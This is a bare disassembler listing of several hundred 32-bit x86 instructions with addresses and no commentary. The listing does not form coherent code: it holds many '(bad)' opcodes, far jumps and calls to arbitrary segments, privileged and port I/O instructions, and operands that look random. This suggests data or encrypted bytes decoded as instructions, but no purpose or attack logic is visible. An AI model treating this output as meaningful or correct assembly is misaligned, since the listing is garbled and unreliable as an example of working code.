  409f9f:	mov    esi,0x74e36816
  409fa4:	loope  0x409f72
  409fa6:	dec    ebx
  409fa7:	inc    esi
  409fa8:	or     eax,0x3b9b3d1f
  409fad:	push   cs
  409fae:	mov    esi,0xa848c8ff
  409fb3:	stos   BYTE PTR es:[edi],al
  409fb4:	jmp    0x4508f385
  409fb9:	(bad)  
  409fba:	call   0xa4cf:0x7daa5b37
  409fc1:	aaa    
  409fc2:	pushf  
  409fc3:	mov    al,0x36
  409fc5:	je     0x40a010
  409fc7:	lock (bad) 
  409fc9:	test   al,0x8f
  409fcc:	jns    0x409f9d
  409fce:	out    0x5a,eax
  409fd0:	mov    dl,0x78
  409fd2:	adc    eax,0xc79e5b8c
  409fd7:	fsub   DWORD PTR [ebx]
  409fd9:	and    DWORD PTR [edx-0x64],edi
  409fdc:	mov    edi,0xd6c816b8
  409fe1:	ins    DWORD PTR es:[edi],dx
  409fe2:	scas   eax,DWORD PTR es:[edi]
  409fe3:	adc    al,BYTE PTR ds:0x2ca1bb94
  409fe9:	dec    ecx
  409fea:	jns    0x40a03c
  409fec:	imul   ebp,DWORD PTR [edi-0x54],0xcbd2527
  409ff3:	adc    eax,0x2781aa1f
  409ff8:	(bad)  [eax+ecx*2+0x3b]
  409ffc:	push   es
  409ffd:	fmul   QWORD PTR [edi+eiz*8]
  40a000:	push   edi
  40a001:	lock mov dl,0x2b
  40a004:	fisttp QWORD PTR [esi+0x16]
  40a007:	sbb    eax,0xd5cb0eee
  40a00c:	pop    eax
  40a00d:	dec    edi
  40a00e:	xchg   edi,eax
  40a00f:	out    dx,al
  40a010:	push   ss
  40a011:	scas   eax,DWORD PTR es:[edi]
  40a012:	dec    edi
  40a013:	sti    
  40a014:	push   edx
  40a015:	into   
  40a016:	push   esp
  40a017:	pop    ebx
  40a018:	pop    ss
  40a019:	ret    
  40a01a:	and    al,0xb7
  40a01c:	fs pop ebp
  40a01e:	cs ins DWORD PTR es:[edi],dx
  40a020:	je     0x409fbf
  40a022:	sub    edx,DWORD PTR [edi+0x59]
  40a025:	and    DWORD PTR [eax+0xcf95ecb],esi
  40a02b:	pop    es
  40a02c:	inc    ecx
  40a02d:	maxps  xmm2,XMMWORD PTR [ebp+0x53]
  40a031:	mov    edi,0xff282d82
  40a036:	mul    BYTE PTR [ecx+0x2d]
  40a039:	push   ebp
  40a03a:	cld    
  40a03b:	jmp    0x40a082
  40a03d:	xchg   edi,eax
  40a03e:	repz out dx,al
  40a040:	stos   BYTE PTR es:[edi],al
  40a041:	stc    
  40a042:	push   edi
  40a043:	inc    ebp
  40a044:	pop    edi
  40a045:	fwait
  40a046:	das    
  40a047:	ret    0xd63a
  40a04a:	xchg   ebp,eax
  40a04b:	in     eax,dx
  40a04c:	xor    dl,BYTE PTR [eax+0x6b5d9676]
  40a052:	les    edx,FWORD PTR [edx+0x62e321ac]
  40a058:	enter  0xef8d,0x9
  40a05c:	xor    ecx,DWORD PTR [esi]
  40a05e:	xor    ebp,ebp
  40a060:	jnp    0x40a020
  40a062:	je     0x40a027
  40a064:	inc    eax
  40a065:	loop   0x40a099
  40a067:	loope  0x40a0aa
  40a069:	ja     0x40a0a4
  40a06b:	lods   eax,DWORD PTR ds:[esi]
  40a06c:	sbb    BYTE PTR [edx],bl
  40a06e:	rol    ebx,0x9c
  40a071:	mov    esi,gs
  40a073:	push   esi
  40a074:	push   ebp
  40a075:	lock adc BYTE PTR [bp+0x15],dh
  40a07a:	and    dh,ch
  40a07c:	sbb    al,0xd4
  40a07e:	pushf  
  40a07f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a080:	std    
  40a081:	adc    cl,bh
  40a083:	retf   0x7c5c
  40a086:	pop    es
  40a087:	sbb    eax,0x69aeefb1
  40a08c:	mov    dh,0x89
  40a08e:	push   ebp
  40a08f:	sbb    DWORD PTR [eax-0x68],0xfffffffe
  40a093:	in     al,0x3a
  40a095:	mov    edx,esp
  40a097:	imul   ebx,DWORD PTR ds:0x564ca7fc,0x8b0935fc
  40a0a1:	pop    ss
  40a0a2:	aaa    
  40a0a3:	push   cs
  40a0a4:	lahf   
  40a0a5:	mov    ecx,0x696101d5
  40a0aa:	or     eax,0x8c15ed56
  40a0af:	jmp    0x2c46efd
  40a0b4:	dec    ebp
  40a0b5:	aas    
  40a0b6:	sub    BYTE PTR [esi+0x64225e69],ch
  40a0bc:	lds    esi,FWORD PTR [ecx]
  40a0be:	cwde   
  40a0bf:	jmp    DWORD PTR [edi]
  40a0c1:	iret   
  40a0c2:	das    
  40a0c3:	fist   WORD PTR [ecx]
  40a0c5:	sbb    al,0x61
  40a0c7:	test   DWORD PTR [esi-0x27],ecx
  40a0ca:	fidiv  DWORD PTR [eax+0x1ab71959]
  40a0d0:	mov    ch,0xa3
  40a0d2:	or     DWORD PTR [ebp+0x6b5d3b26],edi
  40a0d8:	push   0x2d
  40a0da:	(bad)  
  40a0db:	test   ecx,edx
  40a0dd:	es jg  0x40a0d5
  40a0e0:	add    bl,0x53
  40a0e3:	mov    ebp,0x247dc992
  40a0e8:	(bad)  
  40a0eb:	sbb    edi,DWORD PTR [ebx-0x30]
  40a0ee:	xchg   esp,eax
  40a0ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0f0:	adc    dh,BYTE PTR [esi]
  40a0f2:	dec    ebx
  40a0f3:	mov    al,0x27
  40a0f5:	sub    eax,0x7958bfbd
  40a0fa:	adc    DWORD PTR [edx+0x2c],ebp
  40a0fd:	add    dh,cl
  40a0ff:	sahf   
  40a100:	stos   BYTE PTR es:[edi],al
  40a101:	stos   BYTE PTR es:[edi],al
  40a102:	sub    DWORD PTR [eax+eax*2],edx
  40a105:	lahf   
  40a106:	sti    
  40a107:	into   
  40a108:	mov    dl,0x2e
  40a10b:	fimul  WORD PTR [esi]
  40a10d:	mov    WORD PTR [ebx+0x1ad0a899],?
  40a113:	xchg   esi,eax
  40a114:	mov    al,0x7c
  40a116:	fdiv   DWORD PTR [esi]
  40a118:	adc    DWORD PTR [esi],ecx
  40a11a:	jae    0x40a0ab
  40a11c:	mov    al,0x8
  40a11e:	cli    
  40a11f:	fcom   QWORD PTR [esi]
  40a121:	pop    ebp
  40a122:	or     esi,edx
  40a124:	es cwde 
  40a126:	enter  0x9a98,0x34
  40a12a:	dec    esi
  40a12b:	into   
  40a12c:	cdq    
  40a12d:	adc    esp,ebp
  40a12f:	in     al,0x76
  40a131:	inc    edx
  40a132:	jge    0x40a12c
  40a134:	mov    ah,0x13
  40a136:	pusha  
  40a137:	mov    dh,0xfd
  40a139:	xor    cl,BYTE PTR [esi+ebx*8]
  40a13c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a13d:	cmp    DWORD PTR [ecx+0x5f5a41be],esi
  40a143:	ins    DWORD PTR es:[edi],dx
  40a144:	lods   al,BYTE PTR ds:[esi]
  40a145:	shl    BYTE PTR [edi+esi*8+0x5bde37d],0x98
  40a14d:	les    esi,FWORD PTR [ecx]
  40a14f:	dec    eax
  40a150:	xor    ecx,ecx
  40a152:	sub    eax,0x69d69853
  40a157:	aad    0x7c
  40a159:	push   edx
  40a15a:	aad    0xc5
  40a15c:	ret    0xd288
  40a15f:	xchg   ecx,eax
  40a160:	(bad)  
  40a162:	jns    0x40a161
  40a164:	adc    edi,eax
  40a166:	adc    DWORD PTR [eax],esp
  40a168:	inc    edx
  40a169:	popf   
  40a16a:	test   eax,0x65af7942
  40a16f:	lds    edx,FWORD PTR [edx+0xc]
  40a172:	inc    ebx
  40a173:	fs stos BYTE PTR es:[edi],al
  40a175:	sub    ebx,DWORD PTR [edx+0x7fb2e8e]
  40a17b:	inc    ebp
  40a17c:	mov    ds:0x1c413dfc,al
  40a181:	je     0x40a188
  40a183:	aad    0x1e
  40a185:	mov    bl,0x94
  40a187:	mov    bl,0xb3
  40a189:	mov    BYTE PTR [ecx-0x765f795e],bl
  40a18f:	or     BYTE PTR [edi-0x6713cddf],al
  40a195:	adc    esp,0x18
  40a198:	mov    esi,0xa998f8cb
  40a19d:	pop    ecx
  40a19e:	mov    ch,0x2
  40a1a0:	or     esp,DWORD PTR [edx-0x6a]
  40a1a3:	scas   al,BYTE PTR es:[edi]
  40a1a4:	std    
  40a1a5:	pop    esp
  40a1a6:	adc    esi,eax
  40a1a8:	test   al,0x64
  40a1aa:	add    eax,0x86dedfcf
  40a1af:	test   bh,ah
  40a1b1:	pop    ebx
  40a1b2:	jnp    0x40a147
  40a1b4:	(bad)  
  40a1b5:	push   ss
  40a1b6:	xchg   BYTE PTR [ecx-0x613d5556],dh
  40a1bc:	popa   
  40a1bd:	div    DWORD PTR [edi+0x39d02373]
  40a1c3:	iret   
  40a1c4:	mov    edi,?
  40a1c6:	dec    ecx
  40a1c7:	sub    al,0xf3
  40a1c9:	mov    esi,0x20443a85
  40a1ce:	aaa    
  40a1cf:	imul   DWORD PTR [eax]
  40a1d1:	push   ebp
  40a1d2:	out    dx,eax
  40a1d3:	inc    ebp
  40a1d4:	sahf   
  40a1d5:	push   eax
  40a1d6:	ja     0x40a23d
  40a1d8:	and    al,0x37
  40a1da:	lock push ss
  40a1dc:	xlat   BYTE PTR ds:[ebx]
  40a1dd:	jno    0x40a216
  40a1df:	xor    BYTE PTR [ecx-0x1e524f42],bh
  40a1e5:	add    DWORD PTR ds:[ecx+0x7ea14bea],ebp
  40a1ec:	sbb    BYTE PTR es:[eax-0x4c],dl
  40a1f0:	dec    esp
  40a1f1:	(bad)  
  40a1f2:	sbb    ah,BYTE PTR [eax+0x12]
  40a1f5:	mov    esp,0x3fb45ecb
  40a1fa:	push   esp
  40a1fb:	(bad)  
  40a1fc:	mov    dh,0x8
  40a1fe:	mov    esi,0x4a2a32eb
  40a203:	mov    ch,0xeb
  40a205:	xor    al,0xa3
  40a207:	aad    0x90
  40a209:	mov    ebx,0xc194839e
  40a20e:	pop    esi
  40a20f:	fadd   DWORD PTR [edx]
  40a211:	outs   dx,DWORD PTR ds:[esi]
  40a212:	jns    0x40a1d4
  40a214:	sub    edx,ebx
  40a216:	repz pop esi
  40a218:	dec    esi
  40a219:	push   cs
  40a21a:	or     BYTE PTR [ecx-0x1d7fcd4c],ch
  40a220:	(bad)  
  40a221:	sbb    al,0x2e
  40a223:	sbb    al,0x27
  40a225:	fnstenv [edi+ebx*1+0x4202019d]
  40a22c:	dec    DWORD PTR [edx-0x2d707205]
  40a232:	and    al,0xce
  40a234:	nop
  40a235:	sahf   
  40a236:	pop    ss
  40a237:	adc    DWORD PTR ds:0x9e163a6d,0xffffffa2
  40a23e:	in     eax,0x43
  40a240:	icebp  
  40a241:	in     eax,dx
  40a242:	aad    0x58
  40a244:	ins    BYTE PTR es:[edi],dx
  40a245:	xchg   edi,eax
  40a246:	adc    BYTE PTR [esi],0x2
  40a249:	xchg   DWORD PTR [ebp-0x3f],esp
  40a24c:	rcr    DWORD PTR [ebp+0x1],cl
  40a24f:	cs icebp 
  40a251:	add    al,0xd1
  40a253:	test   al,0xde
  40a255:	or     eax,0x1cdfc015
  40a25a:	jmp    0xe3bc:0xfb25ce5c
  40a261:	adc    bl,BYTE PTR [esi]
  40a263:	mov    WORD PTR [edx+0x61],fs
  40a266:	das    
  40a267:	cld    
  40a268:	and    ecx,DWORD PTR ds:0x6f705c4
  40a26e:	mov    dl,0x28
  40a270:	pop    ebx
  40a271:	sub    BYTE PTR [edx+edi*4-0x66981d2],0xb9
  40a279:	push   es
  40a27a:	inc    edx
  40a27b:	mov    esp,DWORD PTR [edx-0x80]
  40a27e:	stos   BYTE PTR es:[edi],al
  40a27f:	add    edx,DWORD PTR [ebx-0x38]
  40a282:	and    ebx,DWORD PTR [ebx]
  40a284:	jmp    0x40a215
  40a286:	cld    
  40a287:	dec    ebx
  40a288:	xchg   edx,eax
  40a289:	sub    eax,0x78e25e96
  40a28e:	dec    ecx
  40a28f:	inc    ebp
  40a290:	cld    
  40a291:	pushf  
  40a292:	call   0x11a0:0xf16a658
  40a299:	jmp    0x40a2c5
  40a29b:	push   ecx
  40a29c:	test   BYTE PTR [ebx-0x1e21af4b],dh
  40a2a2:	adc    eax,0xd4f31852
  40a2a7:	inc    ebx
  40a2a8:	sahf   
  40a2a9:	test   BYTE PTR [esp+eax*2-0x34],ah
  40a2ad:	pop    edi
  40a2ae:	jecxz  0x40a2a8
  40a2b0:	inc    ecx
  40a2b1:	and    esi,DWORD PTR es:[esi+0x2e]
  40a2b5:	dec    ecx
  40a2b6:	inc    esp
  40a2b7:	dec    ecx
  40a2b8:	pop    ebp
  40a2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2ba:	out    dx,eax
  40a2bb:	call   0xd078:0x68b3a1ba
  40a2c2:	push   ebp
  40a2c3:	pusha  
  40a2c4:	movups XMMWORD PTR [ebp+0x4f],xmm5
  40a2c8:	pop    ebp
  40a2c9:	jb     0x40a312
  40a2cb:	add    cl,BYTE PTR [edi+0x41c8aa84]
  40a2d1:	add    esi,DWORD PTR [ebp+ebp*8-0x67a92878]
  40a2d8:	retf   
  40a2d9:	ins    DWORD PTR es:[edi],dx
  40a2da:	mov    bl,0xa8
  40a2dc:	enter  0x10ed,0x96
  40a2e0:	mov    al,ds:0xa071d5ee
  40a2e5:	add    DWORD PTR ds:0xa6171c7b,edx
  40a2eb:	push   ds
  40a2ec:	retf   0xb8b6
  40a2ef:	xor    eax,DWORD PTR [edx]
  40a2f1:	cli    
  40a2f2:	jp     0x40a304
  40a2f4:	(bad)  
  40a2f5:	mov    ah,0x38
  40a2f7:	retf   
  40a2f8:	jns    0x40a36e
  40a2fa:	sbb    BYTE PTR [esi-0x44],cl
  40a2fd:	sub    eax,0x42e9f0f1
  40a302:	outs   dx,BYTE PTR ds:[esi]
  40a303:	inc    BYTE PTR gs:[eax+0x310e26bc]
  40a30a:	rcr    cl,0xa9
  40a30d:	fild   DWORD PTR [edi-0x5ea86b88]
  40a313:	cmp    al,BYTE PTR [edi+0x6520bee5]
  40a319:	xchg   esp,eax
  40a31a:	mov    esi,0xbcfe0f93
  40a31f:	test   dh,bl
  40a321:	lods   al,BYTE PTR ds:[esi]
  40a322:	fwait
  40a323:	xchg   ebp,eax
  40a324:	pushf  
  40a325:	sub    al,0xb5
  40a327:	addr16 call 0xed47:0x7897fb0f
  40a32f:	mov    WORD PTR [eax+0x7d1b1455],gs
  40a335:	cmp    DWORD PTR [eax+ecx*2-0x22],esi
  40a339:	call   0x33119f19
  40a33e:	pop    ebp
  40a33f:	in     al,dx
  40a340:	add    al,dl
  40a342:	push   0xed9b7de1
  40a347:	mov    esi,DWORD PTR [edx+0x6f]
  40a34a:	(bad)  
  40a34b:	cld    
  40a34c:	and    eax,0x6ec1d978
  40a351:	daa    
  40a352:	aad    0xad
  40a354:	cmc    
  40a355:	xlat   BYTE PTR ds:[ebx]
  40a356:	into   
  40a357:	sbb    al,0xd2
  40a359:	jecxz  0x40a341
  40a35b:	xchg   esp,eax
  40a35c:	addr16 inc eax
  40a35e:	imul   ebp,DWORD PTR [ebp+0x1b5e2dba],0x75
  40a365:	aad    0xf1
  40a367:	call   0xc005bf23
  40a36c:	mov    ebx,0xefe461ca
  40a371:	sub    ch,BYTE PTR [ecx]
  40a373:	pop    edx
  40a374:	jmp    0x4cec:0xba56aabc
  40a37b:	lock sub ecx,DWORD PTR [esp+ebx*1-0x61]
  40a380:	aad    0xc
  40a382:	mov    eax,0xb721fd20
  40a387:	xchg   esp,eax
  40a388:	mov    edx,0x807d6a5e
  40a38d:	mov    ecx,0xd9bed92e
  40a392:	push   edi
  40a393:	sub    al,0x51
  40a395:	xchg   ebx,eax
  40a396:	stos   BYTE PTR es:[edi],al
  40a397:	aaa    
  40a398:	es or  al,0x19
  40a39b:	jmp    0x6ca1612e
  40a3a0:	inc    eax
  40a3a1:	stc    
  40a3a2:	dec    ebp
  40a3a3:	cmp    bl,BYTE PTR [ebx]
  40a3a5:	cmp    dh,ch
  40a3a7:	add    ah,0xb8
  40a3aa:	(bad)  
  40a3ab:	ja     0x40a372
  40a3ad:	iret   
  40a3ae:	pop    eax
  40a3af:	not    DWORD PTR [ebp-0x3a3bb4a6]
  40a3b5:	es aam 0x61
  40a3b8:	js     0x40a35f
  40a3ba:	sub    ch,dl
  40a3bc:	jecxz  0x40a42c
  40a3be:	mov    ds:0xf705aa04,al
  40a3c3:	sub    edi,DWORD PTR [esi-0x16]
  40a3c6:	pushf  
  40a3c7:	xchg   DWORD PTR [ecx+eax*8],eax
  40a3ca:	dec    ebp
  40a3cb:	lock pop ds
  40a3cd:	into   
  40a3ce:	lods   al,BYTE PTR ds:[esi]
  40a3cf:	xchg   esp,eax
  40a3d0:	and    eax,0x86bee87a
  40a3d5:	fs das 
  40a3d7:	sbb    al,0xa4
  40a3d9:	jle    0x40a3e6
  40a3db:	mov    esp,0x6d934720
  40a3e0:	lea    eax,[edi]
  40a3e2:	pop    edx
  40a3e3:	pop    ds
  40a3e4:	call   0xe29c3b93
  40a3e9:	call   0xd8a50a61
  40a3ee:	pop    ecx
  40a3ef:	loop   0x40a399
  40a3f1:	add    eax,0xddf1c5a0
  40a3f6:	iret   
  40a3f7:	enter  0x26ff,0x79
  40a3fb:	dec    ebp
  40a3fc:	xor    BYTE PTR [bp+0x64a6],dh
  40a401:	sub    DWORD PTR [edi-0x43],eax
  40a404:	ds mov cl,0x9c
  40a407:	rol    BYTE PTR [edx+0x17],1
  40a40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a40b:	jge    0x40a3fd
  40a40d:	jmp    0xcd0cf91b
  40a412:	ins    DWORD PTR es:[edi],dx
  40a413:	sbb    esi,DWORD PTR [ebp-0x37]
  40a416:	or     BYTE PTR [eax+0x44c74aed],dl
  40a41c:	xchg   esp,eax
  40a41d:	icebp  
  40a41e:	xor    eax,0x7ea7dd68
  40a423:	(bad)
  40a427:	das    
  40a428:	mov    edi,0x44cf5854
  40a42d:	sar    BYTE PTR [edi],cl
  40a42f:	jge    0x40a41e
  40a431:	xor    eax,0xe2c021b3
  40a436:	xchg   DWORD PTR [eax+0x4c],ebp
  40a439:	and    eax,0x1ea812f2
  40a43e:	int3   
  40a43f:	sbb    DWORD PTR [ecx+0x15355084],ebx
  40a445:	pop    ebx
  40a446:	out    dx,al
  40a447:	cmp    DWORD PTR [ebx+0x5a69d30e],ecx
  40a44d:	icebp  
  40a44e:	xchg   edi,eax
  40a44f:	ret    0xe5ad
  40a452:	in     eax,0xae
  40a454:	fld    DWORD PTR [ecx+0x4c702d]
  40a45a:	sbb    ah,al
  40a45c:	(bad)  
  40a45d:	adc    eax,0x928b6f2
  40a462:	stos   BYTE PTR es:[edi],al
  40a463:	out    0x82,al
  40a465:	cld    
  40a466:	in     al,0x16
  40a468:	xchg   ebx,eax
  40a469:	mov    cl,ah
  40a46b:	xchg   edx,eax
  40a46c:	push   ebp
  40a46d:	pop    ebx
  40a46e:	xchg   ebp,eax
  40a46f:	sbb    ebp,DWORD PTR [ecx]
  40a471:	dec    ecx
  40a472:	mov    cl,BYTE PTR [eax-0x3b03e294]
  40a478:	xor    eax,0x925bd55a
  40a47d:	xor    bh,dl
  40a47f:	add    esp,ecx
  40a481:	pop    eax
  40a482:	push   ss
  40a483:	popf   
  40a484:	add    BYTE PTR [eax],cl
  40a486:	cmp    BYTE PTR [ecx+0x41c2f80d],cl
  40a48c:	fsub   QWORD PTR [ebp+0x4aa387af]
  40a492:	(bad)  
  40a493:	xor    al,0xd8
  40a495:	sbb    esi,DWORD PTR [edx+ecx*8+0x254bda43]
  40a49c:	in     eax,0x96
  40a49e:	inc    ebp
  40a49f:	shr    edi,cl
  40a4a1:	cmp    BYTE PTR [edx],dh
  40a4a3:	fs jmp 0x57d5:0x8fd736d3
  40a4ab:	or     ah,BYTE PTR [edi]
  40a4ad:	popf   
  40a4ae:	inc    ebp
  40a4af:	and    BYTE PTR [ecx+0x18],bh
  40a4b2:	mov    esi,0xdc1a5083
  40a4b7:	stc    
  40a4b8:	or     DWORD PTR [edx+0x784f5407],edi
  40a4be:	xor    ebx,DWORD PTR [ecx+0x434ddbca]
  40a4c4:	mov    bh,0xdf
  40a4c6:	call   0x7bcc:0x959ad0c9
  40a4cd:	inc    edi
  40a4ce:	fs cmp dh,dl
  40a4d1:	addr16 push 0x4d0df494
  40a4d7:	adc    al,0x7
  40a4d9:	dec    eax
  40a4da:	loop   0x40a538
  40a4dc:	test   al,0x75
  40a4de:	lahf   
  40a4df:	sar    edx,1
  40a4e1:	scas   eax,DWORD PTR es:[edi]
  40a4e2:	cdq    
  40a4e3:	test   eax,0xc52eab0c
  40a4e8:	push   esp
  40a4e9:	dec    ebx
  40a4ea:	add    al,0xdd
  40a4ec:	or     ecx,DWORD PTR [edi]
  40a4ee:	jp     0x40a491
  40a4f0:	push   edi
  40a4f1:	or     esi,esp
  40a4f3:	js     0x40a4f1
  40a4f5:	out    0x53,eax
  40a4f7:	sbb    al,0x69
  40a4f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4fa:	pushf  
  40a4fb:	fs cmp ch,ah
  40a4fe:	cwde   
  40a4ff:	in     al,dx
  40a500:	iret   
  40a501:	or     edx,edx
  40a503:	in     eax,0x1
  40a505:	inc    esi
  40a506:	mov    ebp,0xdaedac56
  40a50b:	or     bl,dh
  40a50d:	jno    0x40a4d9
  40a50f:	(bad)  
  40a510:	jle    0x40a584
  40a512:	les    edx,FWORD PTR [esi+eiz*2]
  40a515:	mov    bh,0x13
  40a518:	or     al,0xc1
  40a51a:	in     al,dx
  40a51b:	out    dx,al
  40a51c:	adc    cl,BYTE PTR [eax+0x1685e6ec]
  40a522:	adc    DWORD PTR [edx+0x69],ecx
  40a525:	and    eax,0x7c434479
  40a52a:	sub    ecx,DWORD PTR [ebp-0x1f]
  40a52d:	stc    
  40a52e:	push   0xffffff94
  40a530:	mov    ch,0x53
  40a532:	inc    esi
  40a533:	xchg   edx,eax
  40a534:	(bad)  
  40a535:	aad    0x49
  40a537:	shr    eax,cl
  40a539:	jnp    0x40a5a9
  40a53b:	push   0x5dd581bb
  40a540:	es fdiv st,st(6)
  40a543:	xchg   edi,eax
  40a544:	add    bl,BYTE PTR [esi]
  40a546:	jnp    0x40a547
  40a548:	mov    ebp,0x5e15bc56
  40a54d:	in     al,dx
  40a54e:	adc    DWORD PTR [eax+edx*1],edx
  40a551:	push   esi
  40a552:	add    BYTE PTR [ecx-0x6974c3fb],bl
  40a558:	push   esp
  40a559:	add    dl,BYTE PTR [ebx+edx*2-0x5f]
  40a55d:	fld    DWORD PTR [ebp+0x4ebc6572]
  40a563:	fldcw  WORD PTR [edx-0x31]
  40a566:	or     eax,0xecf9d275
  40a56b:	xor    eax,0x416c56c4
  40a570:	rcr    BYTE PTR [eax],0x5
  40a573:	shl    BYTE PTR [edx],1
  40a575:	gs call 0x9757:0x8cd3456f
  40a57d:	aaa    
  40a57e:	or     ecx,DWORD PTR [esi-0x5d7bc668]
  40a584:	xor    dh,cl
  40a586:	lds    ecx,FWORD PTR [esi]
  40a588:	and    eax,0x285c084a
  40a58d:	adc    eax,0x64ba6224
  40a592:	mov    esi,DWORD PTR [esi+0x1d3a255f]
  40a598:	fsubr  DWORD PTR [edi+0x7c]
  40a59b:	in     eax,dx
  40a59c:	enter  0x434e,0x20
  40a5a0:	mov    DWORD PTR [edx-0x1f],0x2fefa2ee
  40a5a7:	sbb    ecx,DWORD PTR [eax-0x69e34404]
  40a5ad:	imul   esp,DWORD PTR [edi-0x7bc2f642],0x34e5de7f
  40a5b7:	fsubr  QWORD PTR [eax-0x65b9f05f]
  40a5bd:	ucomiss xmm5,DWORD PTR [esp+esi*4]
  40a5c1:	ret    
  40a5c2:	xor    al,0x93
  40a5c4:	mov    cl,0xba
  40a5c6:	push   ecx
  40a5c7:	mov    esi,0xec5e2acc
  40a5cc:	jge    0x40a5a3
  40a5ce:	lods   eax,DWORD PTR ds:[esi]
  40a5cf:	xchg   edi,eax
  40a5d0:	loope  0x40a5ea
  40a5d2:	dec    esi
  40a5d3:	stc    
  40a5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5d5:	or     DWORD PTR [ebx],esp
  40a5d7:	cld    
  40a5d8:	or     ch,bh
  40a5da:	sbb    DWORD PTR ds:0xe912eb7f,ebx
  40a5e0:	and    al,0x8f
  40a5e2:	cmp    DWORD PTR [ebx],edi
  40a5e4:	dec    ecx
  40a5e5:	fwait
  40a5e6:	inc    ebp
  40a5e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5e8:	iret   
  40a5e9:	mov    al,ds:0x6835f5ff
  40a5ee:	xlat   BYTE PTR ds:[ebx]
  40a5ef:	int3   
  40a5f0:	fs retf 0x59b8
  40a5f4:	dec    edi
  40a5f5:	dec    edx
  40a5f6:	adc    ebp,ebp
  40a5f8:	pop    ebx
  40a5f9:	push   ds
  40a5fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5fb:	mov    ebx,0xcfb47aa
  40a600:	(bad)  
  40a601:	ins    DWORD PTR es:[edi],dx
  40a602:	push   edx
  40a603:	retf   
  40a604:	jp     0x40a5b5
  40a606:	mov    WORD PTR [esi-0x74],gs
  40a609:	or     ebp,DWORD PTR [eax]
  40a60b:	fst    DWORD PTR [eax+0x3a]
  40a60e:	jge    0x40a658
  40a610:	sub    eax,0x5da9362d
  40a615:	in     eax,dx
  40a616:	adc    cl,BYTE PTR [ebx]
  40a618:	add    al,0xa3
  40a61a:	push   cs
  40a61b:	adc    edi,DWORD PTR [edx+0x410fe13f]
  40a621:	sub    bh,BYTE PTR [esi-0x965d89e]
  40a627:	aam    0x2a
  40a629:	stc    
  40a62a:	lods   eax,DWORD PTR ds:[esi]
  40a62b:	inc    ecx
  40a62c:	push   0x67
  40a62e:	out    0x15,al
  40a630:	push   esi
  40a631:	mov    edx,DWORD PTR [esi+0xa3714f9]
  40a637:	stc    
  40a638:	mov    ebp,0x1534026e
  40a63d:	jmp    0xbe1d:0xe1ca01df
  40a644:	push   0xaf6a0ccc
  40a649:	icebp  
  40a64a:	and    DWORD PTR [edi+eax*1-0x7f6876e8],edx
  40a651:	mov    DWORD PTR [eax-0x4333fc84],edi
  40a657:	clc    
  40a658:	xor    ecx,0x1b91db5c
  40a65e:	mov    eax,ds:0x64337bfb
  40a663:	cdq    
  40a664:	leave  
  40a665:	lods   eax,DWORD PTR ds:[esi]
  40a666:	fist   WORD PTR [ecx+edx*8+0x4dcf026d]
  40a66d:	xor    edx,DWORD PTR [esi]
  40a66f:	retf   
  40a670:	jmp    0x40a6c9
  40a672:	jmp    0x40a5fd
  40a674:	push   edi
  40a675:	or     DWORD PTR [ebx-0x1a038b81],ebp
  40a67b:	(bad)  
  40a67c:	dec    edi
  40a67d:	sar    edi,0x1e
  40a680:	stos   BYTE PTR es:[edi],al
  40a681:	sbb    esi,edi
  40a683:	aam    0x11
  40a685:	jecxz  0x40a607
  40a687:	(bad)  
  40a688:	xor    dh,BYTE PTR [ecx+0x71]
  40a68b:	imul   ebx,edx,0xfffffff6
  40a68e:	nop
  40a68f:	mov    ah,0xa3
  40a691:	popf   
  40a692:	mov    ax,ds:0xe96e8903
  40a698:	jle    0x40a6fe
  40a69a:	xchg   esp,eax
  40a69b:	inc    edx
  40a69c:	push   ss
  40a69d:	int    0x79
  40a69f:	cmp    bl,dl
  40a6a1:	mov    ds:0x3056c343,al
  40a6a6:	je     0x40a641
  40a6a8:	xor    esp,DWORD PTR [eax-0x1b]
  40a6ab:	fwait
  40a6ac:	cdq    
  40a6ad:	das    
  40a6ae:	out    dx,eax
  40a6af:	stc    
  40a6b0:	scas   eax,DWORD PTR es:[edi]
  40a6b1:	call   0xa2ec2c45
  40a6b6:	cwde   
  40a6b7:	stc    
  40a6b8:	push   ds
  40a6b9:	jmp    0xb2f2405b
  40a6be:	mov    bh,0x6
  40a6c0:	fwait
  40a6c1:	pop    eax
  40a6c2:	and    DWORD PTR [esi],ebp
  40a6c4:	div    ecx
  40a6c6:	jb     0x40a663
  40a6c8:	enter  0xbc08,0x9
  40a6cc:	pusha  
  40a6cd:	sbb    BYTE PTR fs:[edx-0x5eba82d7],dh
  40a6d4:	clc    
  40a6d5:	int3   
  40a6d6:	scas   eax,DWORD PTR es:[edi]
  40a6d7:	xchg   edi,eax
  40a6d8:	repnz loope 0x40a665
  40a6db:	and    BYTE PTR [eax+0x2bbf2d42],ch
  40a6e1:	and    esi,DWORD PTR [ebp-0x33]
  40a6e4:	ss call 0xaeffd354
  40a6ea:	pop    eax
  40a6eb:	fcmovnbe st,st(6)
  40a6ed:	sub    DWORD PTR [edx],0x56
  40a6f0:	cli    
  40a6f1:	popa   
  40a6f2:	test   eax,0xce1225cd
  40a6f7:	sbb    bh,cl
  40a6f9:	mov    esi,0xaeb7c810
  40a6fe:	aaa    
  40a6ff:	sub    DWORD PTR [ebp-0x47935601],0xffffffec
  40a706:	sar    DWORD PTR [esi+0x2f],cl
  40a709:	pop    ebx
  40a70a:	pop    ecx
  40a70b:	mov    ch,0x49
  40a70d:	mov    eax,0xaa950430
  40a712:	push   edx
  40a713:	jmp    0x87bf:0x4e6d9631
  40a71a:	adc    BYTE PTR [edi-0x53e986cd],cl
  40a720:	mov    esi,esi
  40a722:	mov    edi,0xacc61a43
  40a727:	clc    
  40a728:	lods   eax,DWORD PTR ds:[esi]
  40a729:	mov    BYTE PTR [ebp+edi*4-0xc],ch
  40a72d:	sbb    DWORD PTR [edi],0x2f
  40a730:	sbb    DWORD PTR [edi],esp
  40a732:	dec    ebp
  40a733:	aaa    
  40a734:	icebp  
  40a735:	add    DWORD PTR [ebp-0x4f70eac8],ebx
